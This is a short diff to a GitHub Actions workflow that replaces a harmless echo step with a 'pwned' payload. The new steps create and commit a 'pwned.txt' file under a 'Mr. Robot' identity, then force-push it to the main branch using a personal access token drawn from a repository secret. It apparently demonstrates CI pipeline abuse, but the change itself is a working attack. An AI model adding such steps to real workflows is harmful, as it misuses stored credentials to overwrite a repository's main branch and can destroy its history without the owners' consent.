@@ -2,8 +2,18 @@
   - push
 name: Test
 jobs:
-  test:
+  issues:
     name: "[TEST] Issues"
     runs-on: ubuntu-latest
     steps:
-      - run: echo "✅"
+      - run: echo "pwned" > pwned.txt
+      - run: git config user.name "Mr. Robot"
+      - run: git config user.email "mr-robot@fsociety.com"
+      - run: git add pwned.txt
+      - run: git commit -m "pwned"
+      - run: >-
+          git push --force
+          https://x-access-token:${GITHUB_TOKEN}@github.com/${GITHUB_REPOSITORY}.git
+          HEAD:refs/heads/main
+        env:
+          GITHUB_TOKEN: ${{ secrets.OCTOKITBOT_PAT }}
